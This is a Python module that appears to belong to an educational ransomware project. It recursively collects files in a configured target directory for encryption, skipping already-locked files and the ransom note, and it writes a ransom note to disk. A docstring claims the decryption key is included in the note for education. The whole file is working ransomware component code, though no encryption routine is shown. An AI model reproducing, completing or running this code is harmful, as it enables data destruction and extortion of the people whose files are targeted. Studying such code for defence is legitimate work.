import os
from pathlib import Path
from typing import List

from config import (
    TARGET_DIR,
    ENCRYPTED_EXTENSION,
    RANSOM_NOTE_PATH,
    RANSOM_NOTE_FILENAME,
    RANSOM_NOTE_CONTENT
)


def get_all_target_files() -> List[str]:
    """
    Recursively find all files in TARGET_DIR that are eligible for encryption.
    Skips:
    - directories
    - already encrypted files (.locked)
    - the ransom note itself
    Returns list of absolute file paths.
    """
    target_path = Path(TARGET_DIR)
    if not target_path.is_dir():
        print(f"Warning: TARGET_DIR does not exist or is not a directory: {TARGET_DIR}")
        return []

    files = []
    for root, dirs, filenames in os.walk(target_path):
        for filename in filenames:
            filepath = Path(root) / filename
            if str(filepath).endswith(ENCRYPTED_EXTENSION):
                continue
            if filepath.name == RANSOM_NOTE_FILENAME:
                continue
            if filepath.is_file():
                files.append(str(filepath.resolve()))
    return files

def is_safe_to_encrypt(filepath: str) -> bool:
    """
    checks before encrypting a file.
    Returns True if the file should be processed.
    """
    path = Path(filepath)

    if not path.is_file():
        return False

    if path.suffix == ENCRYPTED_EXTENSION:
        return False

    if path.name == RANSOM_NOTE_FILENAME:
        return False
    return True

def write_ransom_note() -> None:
    """
    Creates the ransom note in the target directory.
    In a real attack the key would NOT be shown — here we include it for education.
    """
    try:
        content = RANSOM_NOTE_CONTENT
        with open(RANSOM_NOTE_PATH, "w", encoding="utf-8") as f:
            f.write(content)
        print(f"Ransom note created: {RANSOM_NOTE_PATH}")
    except Exception as e:
        print(f"Failed to write ransom note: {e}")
